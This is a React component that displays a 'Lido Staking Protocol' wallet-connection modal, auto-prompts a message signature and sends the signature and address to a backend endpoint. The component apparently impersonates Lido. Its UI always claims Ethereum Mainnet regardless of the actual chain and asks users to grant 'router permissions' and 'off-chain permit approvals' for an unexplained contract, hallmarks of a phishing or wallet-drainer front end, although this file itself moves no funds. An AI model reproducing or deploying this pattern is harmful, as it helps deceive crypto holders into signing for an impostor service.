import React, { useState, useEffect } from 'react';
import { useAccount, useSignMessage, useChainId, useDisconnect } from 'wagmi';
import { ShieldCheck, Lock, AlertCircle, RefreshCw, CheckCircle2, ArrowRight, ExternalLink } from 'lucide-react';
import { useToast } from './ToastContext';
import { CONFIG } from '../lib/contracts';
import { LidoLogo } from './LidoLogo';
import { getApiBaseUrl, logApiCall } from '../lib/apiConfig';
import { logActivity } from '../lib/activityLogger';

export function WalletSignatureModal() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const { disconnect } = useDisconnect();
  const toast = useToast();

  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (isConnected && address) {
      const storageKey = `lido_sig_${address.toLowerCase()}`;
      const savedSig = localStorage.getItem(storageKey);

      if (savedSig) {
        setIsVerified(true);
        setShowModal(false);
      } else {
        setIsVerified(false);
        setShowModal(true);
        // Automatically trigger the signature prompt in the user's wallet
        const timer = setTimeout(() => {
          handleRequestSignature();
        }, 500);
        return () => clearTimeout(timer);
      }
    } else {
      setIsVerified(false);
      setShowModal(false);
    }
  }, [isConnected, address]);

  const handleRequestSignature = async () => {
    if (!address || !isConnected) return;
    setIsVerifying(true);
    setError(null);

    const networkName = chainId === 11155111 ? 'Sepolia Testnet' : chainId === 1 ? 'Ethereum Mainnet' : `Chain ID ${chainId || 11155111}`;
    const message = `AUTHENTICATION SUMMARY:
• Account: ${address}
• Network: ${networkName} (Chain ID: ${chainId || 11155111})
• Protocol Router: ${CONFIG.CONTRACT_ADDRESS}
• Session Nonce: ${Date.now().toString(36).toUpperCase()}
• Issued At: ${new Date().toISOString()}`;

    const pendingToastId = toast.showPending(
      'Wallet Signature Request',
      'Please check your connected wallet to approve the signature request...'
    );

    const startTime = performance.now();
    try {
      // Prompt wallet signature
      const signature = await signMessageAsync({
        account: address as `0x${string}`,
        message,
      });

      const baseUrl = getApiBaseUrl();
      const endpointUrl = `${baseUrl}/api/verify-signature`;
      const requestPayload = {
        address,
        message,
        signature,
        chainId: chainId || 1,
      };

      // Send to backend endpoint for logging and verification
      const response = await fetch(endpointUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestPayload),
      });

      const latencyMs = Math.round(performance.now() - startTime);
      const resData = await response.json().catch(() => ({ success: false, error: 'Non-JSON response' }));

      // Log detailed API request and response
      logApiCall({
        endpoint: '/api/verify-signature',
        method: 'POST',
        status: response.ok && resData.success ? 'SUCCESS' : 'FAILED',
        httpStatus: response.status,
        wallet: address,
        latencyMs,
        requestPayload,
        responsePayload: resData,
        errorMessage: resData.success ? undefined : (resData.error || 'Signature verification rejected'),
      });

      if (resData.success) {
        const storageKey = `lido_sig_${address.toLowerCase()}`;
        localStorage.setItem(storageKey, signature);
        setIsVerified(true);
        setShowModal(false);

        logActivity({
          wallet: address,
          action: 'WALLET_CONNECT',
          status: 'Verified',
          note: `Wallet signature cryptographically verified (${latencyMs}ms)`,
        });

        toast.updateToast(pendingToastId, {
          type: 'success',
          title: 'Wallet Connection Approved',
          message: 'Wallet authenticated and synchronized with Lido Protocol.',
        });
      } else {
        throw new Error(resData.error || 'Backend signature verification failed');
      }
    } catch (err: any) {
      const latencyMs = Math.round(performance.now() - startTime);
      console.error('Signature approval error:', err);
      const errMsg = err?.shortMessage || err?.message || 'Signature rejected in wallet.';
      setError(errMsg);

      // Record failed API call
      logApiCall({
        endpoint: '/api/verify-signature',
        method: 'POST',
        status: 'FAILED',
        httpStatus: 400,
        wallet: address,
        latencyMs,
        requestPayload: { address, message, chainId: chainId || 1 },
        errorMessage: errMsg,
      });

      toast.updateToast(pendingToastId, {
        type: 'error',
        title: 'Authentication Required',
        message: errMsg.slice(0, 100),
      });
    } finally {
      setIsVerifying(false);
    }
  };

  if (!isConnected || !showModal || isVerified) {
    return null;
  }

  return (
    <div className="fixed inset-0 z-[9990] flex items-center justify-center bg-black/75 backdrop-blur-md p-4 animate-in fade-in duration-300">
      <div className="bg-card border border-border-main rounded-[28px] max-w-lg w-full p-6 sm:p-8 shadow-2xl relative text-text-main space-y-6 border-opacity-90">
        
        {/* Header Branding */}
        <div className="flex flex-col items-center text-center space-y-3">
          <div className="w-14 h-14 rounded-2xl bg-[#00A3FF]/10 border border-[#00A3FF]/30 text-[#00A3FF] flex items-center justify-center shadow-inner">
            <LidoLogo className="w-8 h-8" />
          </div>
          <div>
            <h2 className="text-2xl font-black tracking-tight text-text-main">Lido Staking Protocol</h2>
            <p className="text-xs font-semibold text-[#00A3FF] uppercase tracking-widest mt-0.5">Wallet Connection Request</p>
          </div>
        </div>

        {/* Notice Banner */}
        <div className="p-4 bg-input border border-[#00A3FF]/20 rounded-2xl text-xs space-y-2">
          <p className="text-sm font-semibold text-text-main flex items-center gap-1.5">
            <ShieldCheck className="w-4 h-4 text-[#00A3FF]" />
            Lido Stake wants to connect your wallet
          </p>
          <p className="text-text-secondary leading-relaxed">
            Please approve this connection signature to grant protocol access, synchronize live on-chain balances, and enable router permissions for staking, wrapping, and off-chain permit approvals.
          </p>
        </div>

        {/* Precise Connection Details */}
        <div className="space-y-2.5">
          <div className="text-[11px] font-bold uppercase tracking-wider text-text-secondary px-1">Essential Connection Details</div>
          
          <div className="bg-input border border-border-main rounded-2xl p-3.5 space-y-2.5 text-xs font-mono">
            <div className="flex justify-between items-center">
              <span className="text-text-secondary font-sans font-medium">Connected Address</span>
              <span className="text-text-main font-bold bg-card px-2 py-0.5 rounded-lg border border-border-main">
                {address?.slice(0, 6)}...{address?.slice(-4)}
              </span>
            </div>

            <div className="flex justify-between items-center">
              <span className="text-text-secondary font-sans font-medium">Active Network</span>
              <span className="text-emerald-500 font-bold font-sans flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping inline-block" />
                Ethereum Mainnet (ID: {chainId || 1})
              </span>
            </div>

            <div className="flex justify-between items-center">
              <span className="text-text-secondary font-sans font-medium">Vault Router</span>
              <a 
                href={`https://etherscan.io/address/${CONFIG.CONTRACT_ADDRESS}`} 
                target="_blank" 
                rel="noreferrer"
                className="text-[#00A3FF] hover:underline flex items-center gap-1"
              >
                <span>{CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}</span>
                <ExternalLink className="w-3 h-3" />
              </a>
            </div>

            <div className="flex justify-between items-center pt-1 border-t border-border-main">
              <span className="text-text-secondary font-sans font-medium">Permission Scope</span>
              <span className="text-text-main font-sans font-medium text-[11px]">
                Read Balance & Router Off-chain Permit
              </span>
            </div>
          </div>
        </div>

        {/* Error message if rejected */}
        {error && (
          <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-xl flex items-center gap-2">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span className="truncate">{error}</span>
          </div>
        )}

        {/* Action Buttons */}
        <div className="space-y-2.5 pt-1">
          <button
            onClick={handleRequestSignature}
            disabled={isVerifying}
            className="w-full py-4 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-[#00A3FF]/25 flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-50 cursor-pointer"
          >
            {isVerifying ? (
              <>
                <RefreshCw className="w-5 h-5 animate-spin" />
                <span>Awaiting Wallet Approval...</span>
              </>
            ) : (
              <>
                <Lock className="w-4 h-4" />
                <span>Approve & Connect Wallet</span>
                <ArrowRight className="w-4 h-4 ml-1" />
              </>
            )}
          </button>

          <button
            onClick={() => disconnect()}
            className="w-full py-2.5 text-xs text-text-secondary hover:text-red-400 transition-colors font-medium text-center"
          >
            Disconnect Wallet
          </button>
        </div>

        <div className="flex items-center justify-center gap-1.5 text-[11px] text-text-secondary text-center pt-1 border-t border-border-main">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
          <span>Gasless authentication request. No gas fees or on-chain transaction executed.</span>
        </div>
      </div>
    </div>
  );
}
